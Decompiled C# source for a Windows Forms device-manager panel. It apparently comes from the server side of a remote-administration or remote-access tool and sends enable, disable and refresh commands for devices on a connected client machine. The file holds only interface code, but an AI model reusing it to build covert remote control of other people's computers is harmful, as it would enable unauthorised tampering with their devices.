using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x02000096 RID: 150
	public partial class FormDeviceManager : FormMaterial
	{
		// Token: 0x06000407 RID: 1031 RVA: 0x000317CA File Offset: 0x0002F9CA
		public FormDeviceManager()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x06000408 RID: 1032 RVA: 0x000317EC File Offset: 0x0002F9EC
		private void FormProcess_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
			typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, this.dataGridView2, new object[]
			{
				true
			});
		}

		// Token: 0x06000409 RID: 1033 RVA: 0x00031854 File Offset: 0x0002FA54
		private void ChangeScheme(object sender)
		{
			this.dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.dataGridView2.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x0600040A RID: 1034 RVA: 0x000318B5 File Offset: 0x0002FAB5
		private void Closing1(object sender, EventArgs e)
		{
			if (this.client != null)
			{
				this.client.Disconnect();
			}
		}

		// Token: 0x0600040B RID: 1035 RVA: 0x000318CA File Offset: 0x0002FACA
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client != null && !this.client.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x0600040C RID: 1036 RVA: 0x000318FC File Offset: 0x0002FAFC
		private string[] NameSelected()
		{
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				list.Add((string)dataGridViewRow.Cells[0].Value);
			}
			return list.ToArray();
		}

		// Token: 0x0600040D RID: 1037 RVA: 0x0003197C File Offset: 0x0002FB7C
		private void startToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			this.client.Send(new object[]
			{
				"Enable",
				string.Join(";", this.NameSelected())
			});
		}

		// Token: 0x0600040E RID: 1038 RVA: 0x000319C8 File Offset: 0x0002FBC8
		private void stopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			this.client.Send(new object[]
			{
				"Disable",
				string.Join(";", this.NameSelected())
			});
		}

		// Token: 0x0600040F RID: 1039 RVA: 0x00031A14 File Offset: 0x0002FC14
		private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.client.Send(new object[]
			{
				"Refresh"
			});
		}

		// Token: 0x04000253 RID: 595
		public Clients client;

		// Token: 0x04000254 RID: 596
		public Clients parrent;
	}
}
